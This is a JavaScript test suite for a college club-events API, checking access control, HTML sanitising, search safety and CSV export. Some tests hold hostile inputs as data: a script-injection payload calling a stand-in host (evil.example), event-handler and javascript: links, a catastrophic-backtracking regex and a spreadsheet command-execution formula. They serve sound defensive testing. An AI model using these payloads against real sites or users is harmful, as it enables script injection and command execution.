import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import request from 'supertest';
import { DAY, makeClub, makeEvent, makeUser, startTestServer, tokenFor } from './helpers.js';
import { Event } from '../src/modules/event/event.model.js';
import { Registration } from '../src/modules/registration/registration.model.js';
import { REGISTRATION_STATUS } from '../src/modules/registration/registration.constants.js';
import { EVENT_STATUS } from '../src/modules/event/event.constants.js';
import { ROLES } from '../src/modules/user/user.constants.js';
import { trusted } from '../src/utils/db.js';

let ctx;

beforeAll(async () => {
  ctx = await startTestServer();
});
afterAll(async () => {
  await ctx.stop();
});
beforeEach(async () => {
  await ctx.reset();
});

const auth = (token) => ({ Authorization: `Bearer ${token}` });

async function clubWithRep() {
  const rep = await makeUser({ role: ROLES.CLUB_REP });
  const club = await makeClub({ reps: [rep._id] });
  return { rep, club, token: await tokenFor(ctx.app, rep) };
}

describe('GET /events', () => {
  it('shows published events and hides drafts from students', async () => {
    const club = await makeClub();
    await makeEvent(club, { title: 'Published workshop' });
    await makeEvent(club, { title: 'Secret draft', status: EVENT_STATUS.DRAFT });

    const anonymous = await request(ctx.app).get(ctx.api('/events')).expect(200);
    const titles = anonymous.body.data.map((event) => event.title);

    expect(titles).toContain('Published workshop');
    expect(titles).not.toContain('Secret draft');
  });

  it('never ships the full HTML body in a list, only a summary', async () => {
    const club = await makeClub();
    await makeEvent(club, { description: '<p>The long version of the plan, with headings.</p>' });

    const res = await request(ctx.app).get(ctx.api('/events')).expect(200);

    expect(res.body.data[0].description).toBeUndefined();
    expect(res.body.data[0].summary).toBe('The long version of the plan, with headings.');
  });

  it('filters by club, category and date range', async () => {
    const robotics = await makeClub({ name: 'Robotics', slug: 'robotics' });
    const quizzing = await makeClub({ name: 'Quizzing', slug: 'quizzing' });

    await makeEvent(robotics, { title: 'Soldering', category: 'Workshop' });
    await makeEvent(quizzing, { title: 'General quiz', category: 'Competition' });
    await makeEvent(robotics, {
      title: 'Far future build night',
      category: 'Meetup',
      startAt: new Date(Date.now() + 200 * DAY),
      registrationDeadline: new Date(Date.now() + 199 * DAY),
    });

    const byClub = await request(ctx.app).get(ctx.api('/events?club=robotics')).expect(200);
    expect(byClub.body.data).toHaveLength(2);

    const byCategory = await request(ctx.app)
      .get(ctx.api('/events?category=Competition'))
      .expect(200);
    expect(byCategory.body.data.map((event) => event.title)).toEqual(['General quiz']);

    const to = new Date(Date.now() + 30 * DAY).toISOString();
    const byDate = await request(ctx.app)
      .get(ctx.api(`/events?to=${to}`))
      .expect(200);
    expect(byDate.body.data.map((event) => event.title)).not.toContain('Far future build night');
  });

  it('searches the text index without letting a regex through', async () => {
    const club = await makeClub();
    await makeEvent(club, { title: 'Kernel debugging with eBPF' });
    await makeEvent(club, { title: 'Monsoon poetry open mic' });

    const found = await request(ctx.app).get(ctx.api('/events?q=kernel')).expect(200);
    expect(found.body.data.map((event) => event.title)).toEqual(['Kernel debugging with eBPF']);

    // A pathological pattern is just a search term here, not a backtracking bomb.
    const hostile = await request(ctx.app)
      .get(ctx.api(`/events?q=${encodeURIComponent('(a+)+$')}`))
      .expect(200);
    expect(hostile.body.data).toEqual([]);
  });

  it('filters out events with no seats left', async () => {
    const club = await makeClub();
    await makeEvent(club, { title: 'Room to spare', capacity: 10, registeredCount: 3 });
    await makeEvent(club, { title: 'Packed out', capacity: 10, registeredCount: 10 });

    const res = await request(ctx.app).get(ctx.api('/events?hasSeats=true')).expect(200);
    expect(res.body.data.map((event) => event.title)).toEqual(['Room to spare']);
  });

  it('filters to what the signed-in student is actually eligible for', async () => {
    const club = await makeClub();
    await makeEvent(club, { title: 'Open to all' });
    await makeEvent(club, {
      title: 'First years only',
      eligibility: { years: [1], departments: [] },
    });
    await makeEvent(club, {
      title: 'Mechanical only',
      eligibility: { years: [], departments: ['Mechanical Engineering'] },
    });

    const student = await makeUser({ year: 3, department: 'Computer Science & Engineering' });
    const token = await tokenFor(ctx.app, student);

    const res = await request(ctx.app)
      .get(ctx.api('/events?eligibleForMe=true'))
      .set(auth(token))
      .expect(200);

    expect(res.body.data.map((event) => event.title)).toEqual(['Open to all']);
  });

  it('marks the events this student already holds a place at', async () => {
    const club = await makeClub();
    const event = await makeEvent(club);
    const student = await makeUser();
    const token = await tokenFor(ctx.app, student);

    await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/register`))
      .set(auth(token))
      .expect(201);

    const res = await request(ctx.app).get(ctx.api('/events')).set(auth(token)).expect(200);
    expect(res.body.data[0].myRegistration.status).toBe(REGISTRATION_STATUS.REGISTERED);
  });

  it('shows only upcoming events by default, and the archive on request', async () => {
    const club = await makeClub();
    await makeEvent(club, { title: 'Still to come' });
    await makeEvent(club, {
      title: 'Already happened',
      startAt: new Date(Date.now() - 5 * DAY),
      registrationDeadline: new Date(Date.now() - 6 * DAY),
      status: EVENT_STATUS.COMPLETED,
    });

    const byDefault = await request(ctx.app).get(ctx.api('/events')).expect(200);
    expect(byDefault.body.data.map((event) => event.title)).toEqual(['Still to come']);

    const archive = await request(ctx.app).get(ctx.api('/events?when=past')).expect(200);
    expect(archive.body.data.map((event) => event.title)).toEqual(['Already happened']);

    const everything = await request(ctx.app).get(ctx.api('/events?when=all')).expect(200);
    expect(everything.body.data).toHaveLength(2);
  });

  /**
   * A convener is staff, but only for their own club. Pointing the listing at someone
   * else's club id must not expose that club's unpublished work.
   */
  it('does not let one club’s convener read another club’s drafts', async () => {
    const mine = await clubWithRep();
    await makeEvent(mine.club, { title: 'My own draft', status: EVENT_STATUS.DRAFT });

    const theirs = await makeClub({ name: 'Their Club', slug: 'their-club' });
    await makeEvent(theirs, { title: 'Their secret draft', status: EVENT_STATUS.DRAFT });
    await makeEvent(theirs, { title: 'Their published event' });

    const snooping = await request(ctx.app)
      .get(ctx.api(`/events?clubId=${theirs._id}&status=DRAFT&when=all`))
      .set(auth(mine.token))
      .expect(200);
    expect(snooping.body.data).toHaveLength(0);

    const theirBoard = await request(ctx.app)
      .get(ctx.api(`/events?clubId=${theirs._id}&when=all`))
      .set(auth(mine.token))
      .expect(200);
    expect(theirBoard.body.data.map((event) => event.title)).toEqual(['Their published event']);

    // Their own drafts are still visible to them.
    const ownBoard = await request(ctx.app)
      .get(ctx.api(`/events?clubId=${mine.club._id}&status=DRAFT&when=all`))
      .set(auth(mine.token))
      .expect(200);
    expect(ownBoard.body.data.map((event) => event.title)).toEqual(['My own draft']);
  });

  it('caps the page size however large a limit is asked for', async () => {
    const res = await request(ctx.app).get(ctx.api('/events?limit=500')).expect(400);
    expect(res.body.error.details['query.limit']).toBeTruthy();
  });
});

describe('POST /events', () => {
  const validBody = (clubId) => ({
    clubId,
    title: 'Intro to Rust: ownership and lifetimes',
    description: '<p>Four hours on the borrow checker, with exercises.</p>',
    category: 'Workshop',
    venue: 'Seminar Hall B, VMCC',
    startAt: new Date(Date.now() + 10 * DAY).toISOString(),
    endAt: new Date(Date.now() + 10 * DAY + 3 * 60 * 60 * 1000).toISOString(),
    registrationDeadline: new Date(Date.now() + 9 * DAY).toISOString(),
    capacity: 60,
  });

  it('creates a draft owned by the convener’s club', async () => {
    const { club, token } = await clubWithRep();

    const res = await request(ctx.app)
      .post(ctx.api('/events'))
      .set(auth(token))
      .send(validBody(club._id.toHexString()))
      .expect(201);

    expect(res.body.data.status).toBe(EVENT_STATUS.DRAFT);
    expect(res.body.data.slug).toBe('intro-to-rust-ownership-and-lifetimes');
  });

  /** The IDOR case: a real convener, someone else's club id. */
  it('refuses to create an event under a club the caller does not convene', async () => {
    const { token } = await clubWithRep();
    const someoneElse = await makeClub({ name: 'Other Club', slug: 'other-club' });

    const res = await request(ctx.app)
      .post(ctx.api('/events'))
      .set(auth(token))
      .send(validBody(someoneElse._id.toHexString()))
      .expect(403);

    expect(res.body.error.code).toBe('NOT_A_CLUB_REP');
    expect(await Event.countDocuments()).toBe(0);
  });

  it('turns students away before ownership is even considered', async () => {
    const club = await makeClub();
    const token = await tokenFor(ctx.app, await makeUser());

    const res = await request(ctx.app)
      .post(ctx.api('/events'))
      .set(auth(token))
      .send(validBody(club._id.toHexString()))
      .expect(403);

    expect(res.body.error.code).toBe('ROLE_FORBIDDEN');
  });

  it('strips scripts and event handlers out of the description', async () => {
    const { club, token } = await clubWithRep();

    const res = await request(ctx.app)
      .post(ctx.api('/events'))
      .set(auth(token))
      .send({
        ...validBody(club._id.toHexString()),
        description:
          '<p onclick="steal()">Bring a laptop.</p><script>fetch("//evil.example")</script><a href="javascript:alert(1)">tap</a><img src=x onerror=alert(1)>',
      })
      .expect(201);

    const { description } = res.body.data;
    expect(description).toContain('Bring a laptop.');
    expect(description).not.toMatch(/script|onclick|onerror|javascript:/i);
  });

  it('rejects dates that contradict each other', async () => {
    const { club, token } = await clubWithRep();

    const res = await request(ctx.app)
      .post(ctx.api('/events'))
      .set(auth(token))
      .send({
        ...validBody(club._id.toHexString()),
        endAt: new Date(Date.now() + 9 * DAY).toISOString(),
      })
      .expect(400);

    expect(res.body.error.details['body.endAt']).toMatch(/after the start/i);
  });
});

describe('publishing and approval', () => {
  it('sends a convener’s publish to the SAC office, and an admin’s straight to the board', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.DRAFT });

    const submitted = await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/publish`))
      .set(auth(token))
      .expect(200);

    expect(submitted.body.data.status).toBe(EVENT_STATUS.PENDING_APPROVAL);
    expect(submitted.body.data.message).toMatch(/SAC office/);

    const admin = await makeUser({ role: ROLES.ADMIN });
    const adminToken = await tokenFor(ctx.app, admin);

    const approved = await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}/approve`))
      .set(auth(adminToken))
      .send({ approved: true })
      .expect(200);

    expect(approved.body.data.status).toBe(EVENT_STATUS.PUBLISHED);
  });

  it('sends a rejected submission back to draft', async () => {
    const { club } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.PENDING_APPROVAL });

    const adminToken = await tokenFor(ctx.app, await makeUser({ role: ROLES.ADMIN }));

    const res = await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}/approve`))
      .set(auth(adminToken))
      .send({ approved: false, note: 'Clashes with the mid-sem timetable.' })
      .expect(200);

    expect(res.body.data.status).toBe(EVENT_STATUS.DRAFT);
  });

  it('will not publish something whose deadline has already passed', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, {
      status: EVENT_STATUS.DRAFT,
      startAt: new Date(Date.now() + 2 * 60 * 60 * 1000),
      registrationDeadline: new Date(Date.now() - 60 * 1000),
    });

    const res = await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/publish`))
      .set(auth(token))
      .expect(400);

    expect(res.body.error.code).toBe('DEADLINE_PASSED');
  });

  it('refuses to resurrect a cancelled event', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.CANCELLED });

    const res = await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/publish`))
      .set(auth(token))
      .expect(400);

    expect(res.body.error.code).toBe('INVALID_STATUS_TRANSITION');
  });
});

describe('PATCH /events/:id', () => {
  it('freezes the substance of a published event but leaves the logistics editable', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.PUBLISHED });

    const rejected = await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}`))
      .set(auth(token))
      .send({ title: 'Completely different event' })
      .expect(400);
    expect(rejected.body.error.code).toBe('EVENT_NOT_EDITABLE');

    await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}`))
      .set(auth(token))
      .send({ venue: 'Moved to LT-101' })
      .expect(200);
  });

  it('will not cut capacity below the number already registered', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { capacity: 30 });

    const students = await Promise.all([makeUser(), makeUser(), makeUser()]);
    for (const student of students) {
      await request(ctx.app)
        .post(ctx.api(`/events/${event._id}/register`))
        .set(auth(await tokenFor(ctx.app, student)))
        .expect(201);
    }

    const res = await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}`))
      .set(auth(token))
      .send({ capacity: 2 })
      .expect(400);

    expect(res.body.error.code).toBe('CAPACITY_BELOW_REGISTERED');
  });

  it('cannot be used to move an event to another club', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.DRAFT });
    const otherClub = await makeClub({ name: 'Elsewhere', slug: 'elsewhere' });

    await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}`))
      .set(auth(token))
      .send({ clubId: otherClub._id.toHexString() })
      .expect(400);

    expect((await Event.findById(event._id)).clubId.toHexString()).toBe(club._id.toHexString());
  });

  it('cannot be used to write the seat counter directly', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { status: EVENT_STATUS.DRAFT, capacity: 10 });

    await request(ctx.app)
      .patch(ctx.api(`/events/${event._id}`))
      .set(auth(token))
      .send({ registeredCount: 999 })
      .expect(400);

    expect((await Event.findById(event._id)).registeredCount).toBe(0);
  });
});

describe('cancelling an event', () => {
  it('releases every confirmed and waitlisted place', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club, { capacity: 1, waitlistEnabled: true });

    const seated = await makeUser();
    const waiting = await makeUser();
    await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/register`))
      .set(auth(await tokenFor(ctx.app, seated)))
      .expect(201);
    await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/register`))
      .set(auth(await tokenFor(ctx.app, waiting)))
      .expect(201);

    const res = await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/cancel`))
      .set(auth(token))
      .send({ reason: 'The visiting speaker cancelled their trip.' })
      .expect(200);

    expect(res.body.data.status).toBe(EVENT_STATUS.CANCELLED);
    expect(res.body.data.releasedRegistrations).toBe(2);

    const stillHolding = await Registration.countDocuments({
      eventId: event._id,
      status: trusted({
        $in: [REGISTRATION_STATUS.REGISTERED, REGISTRATION_STATUS.WAITLISTED],
      }),
    });
    expect(stillHolding).toBe(0);
  });
});

describe('GET /events/:id/registrations', () => {
  it('is readable by the club’s own convener', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club);
    const student = await makeUser({ name: 'Devika Nambiar', rollNumber: '22B030018' });

    await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/register`))
      .set(auth(await tokenFor(ctx.app, student)))
      .expect(201);

    const res = await request(ctx.app)
      .get(ctx.api(`/events/${event._id}/registrations`))
      .set(auth(token))
      .expect(200);

    expect(res.body.data).toHaveLength(1);
    expect(res.body.data[0].student.name).toBe('Devika Nambiar');
    expect(res.body.meta.counts.REGISTERED).toBe(1);
  });

  /** The attendee list is personal data; a convener of another club has no business in it. */
  it('is closed to a convener from a different club', async () => {
    const { club } = await clubWithRep();
    const event = await makeEvent(club);

    const outsiderRep = await makeUser({ role: ROLES.CLUB_REP });
    await makeClub({ name: 'Outsider Club', slug: 'outsider-club', reps: [outsiderRep._id] });

    const res = await request(ctx.app)
      .get(ctx.api(`/events/${event._id}/registrations`))
      .set(auth(await tokenFor(ctx.app, outsiderRep)))
      .expect(403);

    expect(res.body.error.code).toBe('NOT_A_CLUB_REP');
  });

  it('exports CSV with spreadsheet formulas neutralised', async () => {
    const { club, token } = await clubWithRep();
    const event = await makeEvent(club);

    // A name that Excel would happily execute if we handed it over unescaped.
    const student = await makeUser({ name: "=cmd|' /c calc'!A1", rollNumber: '21FORMULA' });
    await request(ctx.app)
      .post(ctx.api(`/events/${event._id}/register`))
      .set(auth(await tokenFor(ctx.app, student)))
      .expect(201);

    const res = await request(ctx.app)
      .get(ctx.api(`/events/${event._id}/registrations.csv`))
      .set(auth(token))
      .expect(200);

    expect(res.headers['content-type']).toMatch(/text\/csv/);
    expect(res.headers['content-disposition']).toMatch(/attachment; filename=".*\.csv"/);
    // Prefixed with an apostrophe, so Excel reads it as text instead of evaluating it.
    expect(res.text).toContain(`"'=cmd|' /c calc'!A1"`);
    expect(res.text).not.toContain('"=cmd');
  });
});

describe('summary generation', () => {
  it('keeps a space between paragraphs when flattening HTML to a summary', async () => {
    const club = await makeClub();
    await makeEvent(club, {
      title: 'Two paragraph event',
      description: '<p>Teams of three, two per wing.</p><p>Carries championship points.</p>',
    });

    const res = await request(ctx.app).get(ctx.api('/events')).expect(200);
    expect(res.body.data[0].summary).toBe(
      'Teams of three, two per wing. Carries championship points.'
    );
  });
});
